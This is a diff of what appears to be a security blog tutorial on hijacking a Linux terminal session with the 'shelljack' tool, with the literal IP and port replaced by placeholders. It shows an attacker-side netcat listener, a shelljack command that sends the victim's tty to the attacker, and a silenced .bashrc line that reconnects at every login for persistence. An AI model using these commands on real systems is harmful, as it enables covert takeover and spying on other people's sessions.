@@ -34,14 +34,14 @@ We have everything ready, now we are going to test that everything is ok before 
 In the attacker's machine we set up a listener:
 
 ```bash
-nc -lvp 9999
+nc -lvp Port
 ```
 
 Now in the victim's machine we have to know the PID of the tty and execute shelljack:
 
 ```bash
 tty
-./shelljack -n Attacker IP:9999 $$
+./shelljack -n Attacker IP:Port $$
 ```
 
 ![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/victim_poc.png)
@@ -61,7 +61,7 @@ Attacker:
 To apply the persistence we have to modify .bashrc in the victim's machine and add this:
 
 ```bash
-tty &>/dev/null; /home/code/shelljack/shelljack -n 192.168.3.3:9999 $$ &>/dev/null
+tty &>/dev/null; /home/code/shelljack/shelljack -n Attacker IP:Port $$ &>/dev/null
 ```
 
 Now, everytime the victim logs in the machine, if we have the listener, he is going to connect us.
